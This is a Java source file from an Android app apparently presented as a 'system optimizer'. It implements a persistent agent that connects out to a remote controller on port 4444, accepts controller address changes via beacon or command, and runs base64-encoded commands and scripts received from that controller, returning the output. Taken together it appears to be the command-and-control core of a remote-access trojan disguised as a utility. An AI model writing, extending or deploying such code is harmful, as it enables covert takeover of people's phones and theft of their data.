package com.example.systemoptimizer;

import android.content.Context;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Reliable, multi-device-aware agent connection manager.
 *
 * Replaces the old single-threaded reconnect loop with:
 * - persistent endpoint resolution (stored endpoint -> beacon discovery ->
 *   emulator 10.0.2.2 default),
 * - a signed HELLO handshake with per-controller acknowledgement,
 * - concurrent PING/PONG heartbeat handling on the reader thread,
 * - one serialized command worker per connection,
 * - ACK/RESULT/NOTIFY framing with per-command correlation,
 * - exponential backoff + jitter reconnects and connectivity-change nudges.
 *
 * The BackgroundService command handler is unchanged: it keeps receiving a
 * plain OutputStream and keeps writing plain messages. This class only takes
 * care of the transport and framing.
 */
public final class AgentConnectionManager implements NetworkMonitor.Listener, BeaconListener.Callback {

    private static final String TAG = "AgentConnectionManager";

    static final String DEFAULT_HOST = "10.0.2.2";
    static final int DEFAULT_PORT = 4444;
    static final int CONNECT_TIMEOUT_MS = 8000;
    static final int SOCKET_SO_TIMEOUT_MS = 45000;

    private static final long BACKOFF_MIN_MS = 200;
    private static final long BACKOFF_MAX_MS = 30000;
    private static final long NETWORK_CHANGE_DELAY_MS = 800;
    private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;

    /** BackgroundService implements this to run the real command dispatch. */
    public interface CommandExecutor {
        void executeCommand(String command, OutputStream out) throws IOException;
    }

    private final Context context;
    private final DeviceIdentity identity;
    private final CommandExecutor executor;
    private final ServiceHooks hooks;
    private final SecureRandom random = new SecureRandom();

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final Object writeLock = new Object();

    private volatile Socket socket;
    private volatile Thread ctrlThread;
    private volatile String lastEndpoint = "";
    private volatile String sessionState = "stopped";

    private NetworkMonitor networkMonitor;
    private BeaconListener beaconListener;
    private ExecutorService commandWorker;

    /** Minimal hooks into the owning service. */
    public interface ServiceHooks {
        void onExitRequested();

        /**
         * Whether the service still has an ongoing responsibility after the
         * current session ends. When false, a normal session end stops the
         * service instead of reconnecting forever.
         */
        boolean shouldKeepAlive();
    }

    public AgentConnectionManager(Context context,
                                  CommandExecutor executor,
                                  ServiceHooks hooks,
                                  DeviceIdentity identity) {
        this.context = context.getApplicationContext();
        this.executor = executor;
        this.hooks = hooks;
        this.identity = identity;
    }

    public String sessionState() {
        return sessionState;
    }

    /** Runs the whole connection lifecycle until stop() is called. */
    public void run() {
        if (!running.compareAndSet(false, true)) {
            return;
        }
        sessionState = "starting";
        commandWorker = Executors.newSingleThreadExecutor(r -> {
            Thread t = new Thread(r, "agent-command-worker");
            t.setDaemon(true);
            return t;
        });
        networkMonitor = new NetworkMonitor(context, this);
        networkMonitor.register();
        beaconListener = new BeaconListener(context, this::onBeacon);
        beaconListener.start();

        long backoff = BACKOFF_MIN_MS;
        try {
            while (running.get() && !Thread.currentThread().isInterrupted()) {
                long outcome = runOneSession();
                if (!running.get()) {
                    break;
                }
                if (outcome == 0) {
                    // Normal session end (controller closed the connection).
                    // When the service has no ongoing responsibility, idle-stop
                    // instead of reconnecting forever.
                    if (!hooks.shouldKeepAlive()) {
                        Log.i(TAG, "session ended with no active responsibility -> idle stop");
                        running.set(false);
                        hooks.onExitRequested();
                        break;
                    }
                    backoff = BACKOFF_MIN_MS;
                    sleepOrExit(NETWORK_CHANGE_DELAY_MS);
                } else {
                    sleepOrExit(backoff + random.nextInt(300));
                    backoff = Math.min(backoff * 2, BACKOFF_MAX_MS);
                }
            }
        } finally {
            Log.i(TAG, "connection manager stopped");
        }
    }

    /** Returns 0 for a normal session end, non-zero for a failed attempt. */
    private long runOneSession() {
        String endpoint = resolveEndpoint();
        Socket sock = null;
        try {
            sock = new Socket();
            sock.connect(parseEndpoint(endpoint), CONNECT_TIMEOUT_MS);
            sock.setSoTimeout(SOCKET_SO_TIMEOUT_MS);
            synchronized (this) {
                socket = sock;
            }
            sessionState = "connected " + endpoint;

            if (!performHandshake(sock)) {
                sessionState = "auth-failed " + endpoint;
                Log.w(TAG, "handshake failed, disconnect");
                return 1;
            }
            sessionState = "authenticated " + endpoint;

            Log.i(TAG, "authenticated to " + endpoint);
            serveSession(sock);
            return 0;
        } catch (java.net.ConnectException e) {
            Log.w(TAG, "connect refused at " + endpoint + ": " + e.getMessage());
            return 1;
        } catch (SocketTimeoutException e) {
            Log.w(TAG, "connection timed out at " + endpoint);
            return 1;
        } catch (SocketException e) {
            if (running.get()) {
                Log.w(TAG, "socket closed: " + e.getMessage());
            }
            return 1;
        } catch (IOException e) {
            Log.w(TAG, "connection error: " + e.getMessage());
            return 1;
        } catch (Exception e) {
            Log.w(TAG, "unexpected session error", e);
            return 1;
        } finally {
            closeSocket(sock);
        }
    }

    private String resolveEndpoint() {
        String stored = identity.controllerEndpoint();
        if (stored != null && !stored.trim().isEmpty()) {
            return stored.trim();
        }
        return DEFAULT_HOST + ":" + DEFAULT_PORT;
    }

    private InetSocketAddress parseEndpoint(String endpoint) {
        String[] parts = endpoint.split(":");
        String host = parts[0].trim();
        int port = DEFAULT_PORT;
        if (parts.length >= 2) {
            try {
                port = Integer.parseInt(parts[1].trim());
            } catch (NumberFormatException ignored) {
            }
        }
        lastEndpoint = host + ":" + port;
        return new InetSocketAddress(host, port);
    }

    // ------------------------------------------------------------------
    // Handshake (signed, token never sent in plaintext after pairing)
    // ------------------------------------------------------------------

    private boolean performHandshake(Socket sock) throws IOException {
        String nonce = randomHex(16);
        boolean hasToken = identity.token() != null && identity.token().length >= 16;
        String auth = AgentProtocol.AUTH_PAIR_MARKER;
        if (hasToken) {
            auth = AgentProtocol.hmacHex(identity.token(), identity.deviceId() + ":" + nonce);
        }
        String caps = identity.capabilities();
        String state = identity.buildState(context);
        String hello = AgentProtocol.buildHello(identity.deviceId(), identity.protocolVersion(),
                identity.agentVersion(), nonce, auth, caps, state);
        writeFrame(sock, hello);

        String reply = readMessage(sock.getInputStream());
        if (reply == null) {
            Log.w(TAG, "handshake: controller closed");
            return false;
        }
        if (reply.startsWith(AgentProtocol.PREFIX_HELLO_OK)) {
            String[] parts = reply.split("\\|");
            if (parts.length < 5) {
                Log.w(TAG, "handshake: malformed HELLO_OK");
                return false;
            }
            String authSrv = parts[4].trim();
            String issuedTokenB64 = null;
            for (String part : parts) {
                if (part.startsWith("TOKEN=")) {
                    issuedTokenB64 = part.substring("TOKEN=".length());
                    break;
                }
            }
            if (issuedTokenB64 != null && !issuedTokenB64.isEmpty()) {
                // Enrollment / rekey: the controller issued a fresh secret. We
                // cannot verify its signature yet (it is over the new token),
                // so this branch trusts the handshake it just started.
                if (issuedTokenB64.length() < 8) {
                    Log.w(TAG, "pairing: received an invalid token length");
                    return false;
                }
                identity.setToken(issuedTokenB64);
                Log.i(TAG, "pairing: stored controller-issued token securely");
                return true;
            }
            if (hasToken && !AgentProtocol.AUTH_PAIR_MARKER.equals(auth)) {
                String expected = AgentProtocol.hmacHex(identity.token(), "hellook:" + nonce);
                if (!AgentProtocol.hmacEquals(expected, authSrv)) {
                    Log.w(TAG, "handshake: server HMAC mismatch -> rejecting controller");
                    return false;
                }
            }
            return true;
        }
        if (reply.startsWith(AgentProtocol.PREFIX_AUTH_DENIED)) {
            Log.w(TAG, "handshake: controller denied: " + reply);
            return false;
        }
        Log.w(TAG, "handshake: unexpected controller reply, assuming legacy -> disconnect");
        return false;
    }

    private static String randomHex(int bytes) {
        byte[] buf = new byte[bytes];
        new SecureRandom().nextBytes(buf);
        StringBuilder sb = new StringBuilder(bytes * 2);
        for (byte b : buf) {
            sb.append(Character.forDigit((b >> 4) & 0xF, 16));
            sb.append(Character.forDigit(b & 0xF, 16));
        }
        return sb.toString();
    }

    // ------------------------------------------------------------------
    // Session: read loop multiplexing heartbeat / commands / control
    // ------------------------------------------------------------------

    private void serveSession(Socket sock) throws IOException {
        while (running.get()) {
            String message;
            try {
                message = readMessage(sock.getInputStream());
            } catch (SocketTimeoutException e) {
                // agent-side liveness guard: controller went silent -> reconnect
                Log.w(TAG, "heartbeat window expired, reconnecting");
                return;
            }
            if (message == null) {
                Log.i(TAG, "controller closed the connection");
                return;
            }

            if (message.startsWith(AgentProtocol.PREFIX_PING)) {
                final String seq = message.substring(AgentProtocol.PREFIX_PING.length());
                sendFrameOrNotify(sock, "PONG|" + seq);
                continue;
            }
            if (message.startsWith(AgentProtocol.PREFIX_CMD)) {
                String rest = message.substring(AgentProtocol.PREFIX_CMD.length());
                int pipe = rest.indexOf('|');
                final String id;
                final String b64;
                if (pipe < 0) {
                    id = "noid";
                    b64 = rest;
                } else {
                    id = rest.substring(0, pipe);
                    b64 = rest.substring(pipe + 1);
                }
                final String raw = AgentProtocol.unbase64(b64);
                if (raw == null) {
                    continue;
                }
                dispatchCommand(sock, id, raw);
                continue;
            }
            if (message.startsWith(AgentProtocol.PREFIX_STATE_REQ)) {
                String id = message.substring(AgentProtocol.PREFIX_STATE_REQ.length());
                String state = identity.buildState(context);
                try {
                    writeFrame(sock, AgentProtocol.PREFIX_RESULT + id + "|OK|"
                            + AgentProtocol.base64(state));
                } catch (IOException e) {
                    Log.w(TAG, "state reply failed", e);
                }
                continue;
            }
            if (message.startsWith(AgentProtocol.PREFIX_CTRL_EXIT)) {
                Log.i(TAG, "controller requested agent shutdown");
                try {
                    writeFrame(sock, "ACK|0");
                } catch (IOException ignored) {
                }
                running.set(false);
                closeSocket(sock);
                hooks.onExitRequested();
                return;
            }
            if (message.startsWith(AgentProtocol.PREFIX_SET_CTRL)) {
                String value = message.substring(AgentProtocol.PREFIX_SET_CTRL.length());
                identity.setControllerEndpoint(value);
                Log.i(TAG, "controller endpoint updated to " + value);
                continue;
            }
            // Defensive legacy path: treat a bare command as a request and reply.
            dispatchCommand(sock, "legacy", message);
        }
    }

    private void dispatchCommand(final Socket sock, final String id, final String raw) {
        final Runnable task = () -> {
            CommandOutputStream sink = new CommandOutputStream(id, raw, sock);
            try {
                writeFrame(sock, AgentProtocol.PREFIX_ACK + id);
            } catch (IOException e2) {
                Log.w(TAG, "ACK send failed", e2);
                return;
            }
            try {
                executor.executeCommand(raw, sink);
                sink.finish(true, null);
            } catch (Exception e) {
                try {
                    String captured = sink.capturedText();
                    String detail = e.getMessage() == null ? e.toString() : e.getMessage();
                    String payload = (captured.isEmpty() ? "" : captured + "\n") + detail;
                    sink.emitError(payload);
                } catch (Exception e2) {
                    Log.w(TAG, "error reply failed", e2);
                }
            }
            if ("exit".equals(raw) || raw.startsWith("exit:")) {
                running.set(false);
                closeSocket(sock);
                hooks.onExitRequested();
            }
        };
        try {
            commandWorker.execute(task);
        } catch (Exception e) {
            Log.w(TAG, "worker rejected command", e);
        }
    }

    // ------------------------------------------------------------------
    // OutputSink: capture handler writes -> one RESULT (or later NOTIFY)
    // ------------------------------------------------------------------

    private final class CommandOutputStream extends OutputStream {
        private final String id;
        private final String raw;
        private final Socket sock;
        private final ByteArrayOutputStream buffer = new ByteArrayOutputStream(1024);
        private final StringBuilder captured = new StringBuilder();
        private boolean resultSent = false;

        CommandOutputStream(String id, String raw, Socket sock) {
            this.id = id;
            this.raw = raw;
            this.sock = sock;
        }

        @Override
        public synchronized void write(int b) {
            buffer.write(b);
        }

        @Override
        public synchronized void write(byte[] b, int off, int len) {
            buffer.write(b, off, len);
        }

        @Override
        public synchronized void flush() {
            byte[] all = buffer.toByteArray();
            buffer.reset();
            if (all.length < 4) {
                return;
            }
            String payload = new String(all, 4, all.length - 4, StandardCharsets.UTF_8);
            if (!resultSent) {
                captured.append(payload).append('\n');
            } else {
                emitNotify(payload);
            }
        }

        private void emitNotify(String payload) {
            try {
                writeFrame(sock, AgentProtocol.PREFIX_NOTIFY + AgentProtocol.base64(payload));
            } catch (IOException e) {
                Log.w(TAG, "notify failed", e);
            }
        }

        private synchronized void markResult(String status, String payload) {
            if (resultSent) {
                return;
            }
            resultSent = true;
            try {
                writeFrame(sock, AgentProtocol.PREFIX_RESULT + id + "|" + status + "|"
                        + AgentProtocol.base64(payload));
            } catch (IOException e) {
                Log.w(TAG, "result failed", e);
            }
            // Any buffered-but-not-flushed payload from an async writer -> notify.
            byte[] leftover = buffer.toByteArray();
            buffer.reset();
            if (leftover.length >= 4) {
                String payloadText = new String(leftover, 4, leftover.length - 4, StandardCharsets.UTF_8);
                emitNotify(payloadText);
            }
        }

        synchronized String capturedText() {
            return captured.toString().trim();
        }

        void emitError(String detail) {
            markResult("ERR", detail);
        }

        synchronized void finish(boolean ok, String extra) {
            if (resultSent) {
                return;
            }
            String payload = captured.toString();
            String trimmed = payload.trim();
            boolean empty = trimmed.isEmpty();
            if (empty && raw.startsWith("script_base64:")) {
                payload = "تم استلام النص: سيُنفَّذ على الجهاز (المخرجات ستصل عبر إشعار لاحق)";
            } else if (empty && extra != null) {
                payload = extra;
            }
            markResult(ok ? "OK" : "ERR", payload.trim());
        }
    }

    // ------------------------------------------------------------------
    // Network / beacon callbacks
    // ------------------------------------------------------------------

    @Override
    public void onNetworkChanged() {
        Log.i(TAG, "network changed, forcing immediate reconnect");
        Socket s = socket;
        if (s != null) {
            closeSocket(s);
        }
    }

    public void onBeacon(String host, int port) {
        String endpoint = host + ":" + port;
        String current = identity.controllerEndpoint();
        if (current == null || current.trim().isEmpty() || !current.equals(endpoint)) {
            if (lastEndpoint.equals(endpoint)) {
                return;
            }
            Log.i(TAG, "beacon endpoint accepted: " + endpoint);
            identity.setControllerEndpoint(endpoint);
            Socket s = socket;
            if (s != null) {
                closeSocket(s);
            }
        }
    }

    public void stop() {
        running.set(false);
        Socket s = socket;
        if (s != null) {
            closeSocket(s);
        }
        if (commandWorker != null) {
            commandWorker.shutdownNow();
        }
        if (networkMonitor != null) {
            networkMonitor.unregister();
        }
        if (beaconListener != null) {
            beaconListener.stop();
        }
        Thread t = ctrlThread;
        if (t != null) {
            t.interrupt();
        }
    }

    // ------------------------------------------------------------------
    // Low-level framing (shared with BackgroundService semantics)
    // ------------------------------------------------------------------

    private static void writeFrame(Socket sock, String message) throws IOException {
        OutputStream out = sock.getOutputStream();
        byte[] payload = message.getBytes(StandardCharsets.UTF_8);
        out.write((payload.length >>> 24) & 0xFF);
        out.write((payload.length >>> 16) & 0xFF);
        out.write((payload.length >>> 8) & 0xFF);
        out.write(payload.length & 0xFF);
        out.write(payload);
        out.flush();
    }

    private void sendFrameOrNotify(Socket sock, String message) {
        // Heartbeat replies never block command work: they bypass the worker.
        try {
            writeFrame(sock, message);
        } catch (IOException e) {
            Log.w(TAG, "send failed", e);
        }
    }

    static String readMessage(InputStream in) throws IOException {
        byte[] header = readFully(in, 4, true);
        if (header == null) {
            return null;
        }
        long length = ((long) (header[0] & 0xFF) << 24)
                | ((long) (header[1] & 0xFF) << 16)
                | ((long) (header[2] & 0xFF) << 8)
                | ((long) (header[3] & 0xFF));
        if (length <= 0 || length > MAX_MESSAGE_SIZE) {
            throw new IOException("invalid message length: " + length);
        }
        byte[] payload = readFully(in, (int) length, false);
        return new String(payload, StandardCharsets.UTF_8);
    }

    private static byte[] readFully(InputStream in, int size, boolean allowEof) throws IOException {
        byte[] data = new byte[size];
        int offset = 0;
        while (offset < size) {
            int read = in.read(data, offset, size - offset);
            if (read == -1) {
                if (allowEof && offset == 0) {
                    return null;
                }
                throw new EOFException("connection closed mid-message");
            }
            offset += read;
        }
        return data;
    }

    private static void closeSocket(Socket sock) {
        if (sock != null) {
            try {
                sock.close();
            } catch (IOException ignored) {
            }
        }
    }

    private static void sleepOrExit(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}